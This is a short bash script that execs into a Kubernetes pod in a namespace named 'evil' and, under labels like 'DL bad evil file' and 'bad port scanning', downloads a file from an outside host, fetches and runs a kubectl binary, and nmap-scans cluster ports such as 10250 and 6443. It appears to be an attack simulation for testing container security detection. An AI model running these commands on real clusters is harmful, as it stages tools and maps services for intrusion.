#!/bin/bash -l

export KUBECONFIG=/var/www/.kube/config

PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')

echo "DL bad evil file"
kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"

echo "Kubernetes attack"
kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"

echo "bad domain"
kubectl exec $PO -n evil -- bash -c "curl github.com"

echo "bad port scanning"
kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"
